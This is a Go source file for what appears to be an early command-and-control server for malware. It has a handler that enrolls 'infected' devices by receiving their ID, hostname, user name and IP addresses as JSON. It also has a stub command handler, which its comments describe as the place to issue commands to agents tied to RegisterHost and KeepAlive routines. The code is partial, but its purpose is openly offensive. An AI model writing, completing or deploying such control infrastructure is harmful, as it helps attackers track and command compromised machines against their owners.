package Webserver

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
)

type Enumeration struct {
	ID       int      `json:"ID"`
	Hostname string   `json:"Hostname"`
	User     string   `json:"User"`
	IP       []string `json:"IP"`
}

func HomeHandler(writer http.ResponseWriter, request *http.Request) {
	defaultMessage := []byte("Listening for incoming connections ")
	_, err := writer.Write(defaultMessage)
	if err != nil {
		log.Fatal(err)
	}

	//It will need to take incoming strings
}

func InfectedHandler(writer http.ResponseWriter, request *http.Request) {
	//this is where registered devices are kept - receives the JSON
	//eventually this should append to a database
	//sends a command response - tied to Agent.RegisterHost()

	var device Enumeration
	//receive the JSON
	req, err := ioutil.ReadAll(request.Body)
	if err != nil {
		log.Fatalf("Issue getting enumeration data from device: %s", err)
	}
	json.Unmarshal([]byte(req), &device)
	log.Printf("Enrolled a new device: %d", device.ID)

	//placeholder, just print the struct
	fmt.Println(device)
}

func CommandHandler(writer http.ResponseWriter, request *http.Request) {
	//Reads the header of the request and issue commands
	//Tied to Agent.KeepAlive()
}
